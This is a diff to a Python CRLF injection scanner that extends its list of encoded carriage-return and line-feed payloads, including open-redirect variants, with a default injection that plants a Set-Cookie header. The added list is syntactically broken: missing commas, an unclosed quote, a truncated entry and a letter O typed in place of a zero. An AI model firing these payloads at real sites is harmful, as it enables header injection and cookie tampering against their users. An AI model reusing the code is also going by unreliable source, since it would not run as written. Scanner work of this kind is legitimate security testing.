@@ -14,7 +14,7 @@ class CrlfScanner():
     APPEND_LIST = ["", "crlf", "?crlf=", "#"]
 
     # List of escape sequences that possibly result in crlf.
-    ESCAPE_LIST = ['%0d','%0a', '%0d%0a', '%23%0d', '%23%0a', '%23%0d%0a''%%0a0a','%25%30%61','%25%30,'%250a','%25250a','%2e%2e%2f%0d%0','%2f%2e%2e%0d%0a','%2F..%0d%0a','%3f%0d%0a','%3f%0d','%u000a']
+    ESCAPE_LIST = ['%0d','%0a', '%0d%0a', '%23%0d', '%23%0a', '%23%0d%0a''%%0a0a','%25%30%61','%25%30,'%250a','%25250a','%2e%2e%2f%0d%0','%2f%2e%2e%0d%0a','%2F..%0d%0a','%3f%0d%0a','%3f%0d','%u000a','%0A%20','%20%0A','%E5%98%8A%E5%98%8D','%E5%98%8A%E5%98%8D%0A','%3F%0A','crlf%0A','crlf%0A%20','crlf%20%0A','crlf%23%OA','crlf%E5%98%8A%E5%98%8D','crlf%E5%98%8A%E5%98%8D%0A','crlf%3F%0A','%0D%20','%20%0D','%23%0A','%E5%98%8A%E5%98%8D','%E5%98%8A%E5%98%8D%0D','crlf%0D','crlf%0D%20','crlf%20%0D','crlf%23%0D','crlf%23%0A','crlf%E5%98%8A%E5%98%8D','crlf%E5%98%8A%E5%98%8D%0D','crlf%3F%0D','%0D%0A','%0D%0A%20','%20%0D%0A','\r\n','%5cr%5cn','%E5%98%8A%E5%98%8D','%E5%98%8A%E5%98%8D%0D%0A','crlf%0D%0A%20','crlf%20%0D%0A','crlf%23%0D%0A','crlf\r\n','crlf%5cr%5cn','crlf%E5%98%8A%E5%98%8D','crlf%E5%98%8A%E5%98%8D%0D%0A','crlf%3F%0D%0A','%0D%0A%09','crlf%0D%0A%09','%25%30A','//www.google.com/%2F%2E%2E%0D%0A','/www.google.com/%2E%2E%2F%0D%0A','/google.com/%2F..%0D%0A']
 
     # By default, the scanner will try to inject a Set-Cookie statment.
     DEFAULT_INJ = "Set-Cookie:param=crlf;"
